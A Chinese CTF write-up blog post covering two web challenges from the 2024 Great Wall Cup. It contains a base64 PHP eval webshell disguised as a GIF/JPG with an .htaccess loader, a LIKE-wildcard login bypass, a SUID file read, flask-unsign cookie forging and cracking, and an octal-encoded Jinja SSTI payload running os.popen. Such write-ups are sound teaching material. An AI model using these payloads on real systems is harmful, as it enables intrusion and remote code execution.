+++
title = "长城杯2024京津冀"
slug = "great-wall-cup-2024-beijing-tianjin-hebei"
description = ""
date = "2024-09-09T09:58:00"
lastmod = "2024-09-09T09:58:00"
image = ""
license = ""
categories = ["赛题"]
tags = ["工具", "session"]
+++

# 0x01 前言

WM坐牢之后发现还有这个比赛，能看看嘿嘿

# 0x02 question

## SQLUP

打开题目环境之后发现源码里面说要`fuzz`，发现`%`,没被过滤直接通配符了

```
username:admin	
password:%%
```

测试了一下确实可以

```sql
mysql> select * from flag where name like "%";
+----+------------+-------------------+
| id | name       | description       |
+----+------------+-------------------+
|  1 | alpha      | first             |
|  2 | beta       | second            |
|  3 | gamma      | third             |
|  4 | alphabet   | first-alphabet    |
|  5 | beta-gamma | second-beta-gamma |
+----+------------+-------------------+
5 rows in set (0.02 sec)
```

进入之后发现是上传文件还是我们的老搭档Apache，直接上文件

```
poc.jpg:

GIF89a66
PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=
```

```
.htaccess:

#define width 1337
#define height 1337
php_value auto_prepend_file "php://filter/convert.base64-decode/resource=./poc.jpg"
AddType application/x-httpd-php .jpg
```

链接antsword，权限不够，虚拟终端`tac /flag`

后面看有点运气好了，因为我没有检查权限的问题(习惯用tac)

```bash
(www-data:find) $ find / -perm -u=s -type f 2>/dev/null
/bin/umount
/bin/ping
/bin/su
/bin/ping6
/bin/mount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/tac 
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newgrp
/usr/lib/eject/dmcrypt-get-device
```

所以也不用提权,后来深究`%`通配符的时候,知道了`%%`被后端处理的时候是会被解析成一个`%`也就是通配符

## CandyShop(浮现)

```python
import datetime
from flask import Flask, render_template, render_template_string, request, redirect, url_for, session, make_response
from wtforms import StringField, PasswordField, SubmitField
from wtforms.validators import DataRequired, Length
from flask_wtf import FlaskForm
import re


app = Flask(__name__)

app.config['SECRET_KEY'] = 'xxxxxxx'

class RegistrationForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(min=2, max=20)])
    password = PasswordField('Password', validators=[DataRequired(), Length(min=6, max=20)])
    submit = SubmitField('Register')
    
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[DataRequired(), Length(min=2, max=20)])
    password = PasswordField('Password', validators=[DataRequired(), Length(min=6, max=20)])
    submit = SubmitField('Login')

class Candy:
    def __init__(self, name, image):
        self.name = name
        self.image = image

class User:
    def __init__(self, username, password):
        self.username = username
        self.password = password

    def verify_password(self, username, password):
        return (self.username==username) & (self.password==password)
class Admin:
    def __init__(self):
        self.username = ""
        self.identity = ""

def sanitize_inventory_sold(value):
    return re.sub(r'[a-zA-Z_]', '', str(value))
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

candies = [Candy(name="Lollipop", image="images/candy1.jpg"),
    Candy(name="Chocolate Bar", image="images/candy2.jpg"),
    Candy(name="Gummy Bears", image="images/candy3.jpg")
]
users = []
admin_user = []
@app.route('/register', methods=['GET', 'POST'])
def register():
    form = RegistrationForm()
    if form.validate_on_submit():
        user = User(username=form.username.data, password=form.password.data)
        users.append(user)
        return redirect(url_for('login'))
    
    return render_template('register.html', form=form)

@app.route('/login', methods=['GET', 'POST'])
def login():
    form = LoginForm()
    if form.validate_on_submit():
        for u in users:
            if u.verify_password(form.username.data, form.password.data):
                session['username'] = form.username.data
                session['identity'] = "guest"
                return redirect(url_for('home'))
    
    return render_template('login.html', form=form)

inventory = 500
sold = 0
@app.route('/home', methods=['GET', 'POST'])
def home():
    global inventory, sold
    message = None
    username = session.get('username')
    identity = session.get('identity')

    if not username:
        return redirect(url_for('register'))
    
    if sold >= 10 and sold < 500:
        sold = 0
        inventory = 500
        message = "But you have bought too many candies!"
        return render_template('home.html', inventory=inventory, sold=sold, message=message, candies=candies)

    if request.method == 'POST':
        action = request.form.get('action')
        if action == "buy_candy":
            if inventory > 0:
                inventory -= 3
                sold += 3
            if inventory == 0:
                message = "All candies are sold out!"
            if sold >= 500:
                with open('secret.txt', 'r') as file:
                    message = file.read()

    return render_template('home.html', inventory=inventory, sold=sold, message=message, candies=candies)


@app.route('/admin', methods=['GET', 'POST'])
def admin():
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    admin = Admin()
    merge(session,admin)
    admin_user.append(admin)
    return render_template('admin.html', view='index')

@app.route('/admin/view_candies', methods=['GET', 'POST'])
def view_candies():
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    return render_template('admin.html', view='candies', candies=candies)

@app.route('/admin/add_candy', methods=['GET', 'POST'])
def add_candy():
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    candy_name = request.form.get('name')
    candy_image = request.form.get('image')
    if candy_name and candy_image:
        new_candy = Candy(name=candy_name, image=candy_image)
        candies.append(new_candy)
    return render_template('admin.html', view='add_candy')

@app.route('/admin/view_inventory', methods=['GET', 'POST'])
def view_inventory():
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    inventory_value = sanitize_inventory_sold(inventory)
    sold_value = sanitize_inventory_sold(sold)
    return render_template_string("商店库存:" + inventory_value + "已售出" + sold_value)

@app.route('/admin/add_inventory', methods=['GET', 'POST'])
def add_inventory():
    global inventory
    username = session.get('username')
    identity = session.get('identity')
    if not username or identity != 'admin':
        return redirect(url_for('register'))
    if request.form.get('add'):
        num = request.form.get('add')
        inventory += int(num)
    return render_template('admin.html', view='add_inventory')

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=1337)
```

很明显的SSTI，只不过这个是个`session`，我们先把`key`搞出来

使用`flask-unsign`

```
加密：

flask-unsign --sign --cookie "<Session CookieValue>" --secret '<Secretkey>'

解密：

flask-unsign --decode --cookie '<SessionCookieStructure>'

爆破key：

flask-unsign --unsign --cookie '<SessionCookieStructure>'
```

得到key为`a123456`

伪造sold为500得到

```
flag in /tmp/xxxx/xxx/xxxx/flag 
```

最后找回回显点就是那个`inventory`应该是注入点，但是绕不过，全剧终

后面看了师傅WP发现可以8进制绕过

```
flask-unsign --sign --cookie "{'identity': 'admin', 'username': 'test3','__init__':{'__global
s__':{'sold':857,'inventory':'{{\'\'[\'\\137\\137\\143\\154\\141\\163\\163\\137\\137\'][\'\\137\\137\\142\\141\\163\\145\\163\\137\\137\'][0][\'\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137\']()[133][\'\\137\\137\\151\\156\\151\\164\\137\\137\'][\'\\137\\137\\147\\154\\157\\142\\141\\154\\163\\137\\137\'][\'\\137\\137\\142\\165\\151\\154\\164\\151\\156\\163\\137\\137\'][\'\\145\\166\\141\\154\'](\'\\137\\137\\151\\155\\160\\157\\162\\164\\137\\137\\050\\042\\157\\163\\042\\051\\056\\160\\157\\160\\145\\156\\050\\042\\167\\150\\157\\141\\155\\151\\042\\051\\056\\162\\145\\141\\144\\050\\051\')}}'}}}" --secret 'a123456'
```

后面慢慢`cd /tmp`逐步往下即可

# 0x03 小结

还是可以多知道了一个工具，但是session伪造这个知识点我觉得还是有必要深究一下了！
